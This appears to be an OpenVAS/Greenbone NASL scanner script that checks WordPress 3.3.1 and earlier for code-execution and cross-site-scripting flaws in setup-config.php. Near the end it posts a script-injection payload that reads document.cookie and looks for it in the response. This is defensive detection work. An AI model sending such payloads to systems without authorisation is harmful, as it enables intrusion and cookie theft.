CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802298" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2011-4898", "CVE-2011-4899", "CVE-2012-0782" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-02-01 09:09:09 +0530 (Wed, 01 Feb 2012)" );
	script_name( "WordPress 'setup-config.php' Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18417" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2012/Jan/416" );
	script_xref( name: "URL", value: "https://www.trustwave.com/spiderlabs/advisories/TWSL2012-002.txt" );
	script_xref( name: "URL", value: "http://wordpress.org/support/topic/wordpress-331-code-execution-cross-site-scripting" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to conduct PHP code
  execution and cross-site scripting attacks." );
	script_tag( name: "affected", value: "WordPress versions 3.3.1 and prior" );
	script_tag( name: "insight", value: "Multiple flaws are due to improper validation of user-supplied input
  passed to the 'setup-config.php' installation page, which allows attackers to
  execute arbitrary HTML and PHP code in the context of an affected site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WordPress and is prone to multiple
  vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-admin/setup-config.php?step=2";
postData = "dbname=<script>alert(document.cookie)</script>&uname=root&pwd=&dbhost=localhost&prefix=wp_&submit=Submit";
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData, "\\r\\n" );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

